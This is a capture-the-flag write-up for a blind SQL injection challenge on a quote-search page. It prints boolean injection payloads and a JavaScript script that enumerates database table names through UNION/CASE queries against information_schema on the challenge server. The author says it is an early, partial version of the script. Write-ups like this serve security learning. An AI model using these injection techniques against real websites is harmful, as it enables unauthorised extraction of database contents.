>Black Hole! (400)

>[Houston...We lost the Key!](https://www.phrasemix.com/collections/the-25-most-famous-english-movie-quotes)
>Note: No automated tools allowed. Use custom written scripts with single thread/instance only.

The challenge was a blind SQL challenge. The search page searched in a database
with quotes from the above link. The challenge flag was in another table in the same
database. 

The 2 queries: `ma%' and 1=1 #` & `ma%' and 1=2 #` gave different outputs
and we were able to build script over that vulnerability to get the flag.
Unfortunately, I lost my final script because I wrote it inside /tmp, 
but here is an early version of a  JS based script we used to find the table names

```js
var ans = "";
var inject = "";
for(var j=0; j<22; j++)
for (var i=0; i<26; i++) {

  inject += String.fromCharCode(i+97) + "%";
  search = "' and 1=2 union select case when (select table_name from information_schema.tables where table_name like '%' and table_schema != 'performance_schema' and table_schema != 'mysql' and table_schema != 'information_schema' and table_schema != 'mysql' LIMIT 1, 1) LIKE '" + inject + "' then 1 else 0 end#";
  $.ajax({
    url: "https://cctc-3.cloudapp.net/cctc/level-7/validate.php",
    type: "POST",
    data: "search=" + search,
    async: false,
    success: function (data) {
      if (data.indexOf("Nothing Found") !== -1) {
        ans += inject;
        console.log(ans);
      } else {
    	ans += "_"
	  }
    },
    error: function (data) {
      console.log(data);
    }
  });
  inject = ans;
}
}
```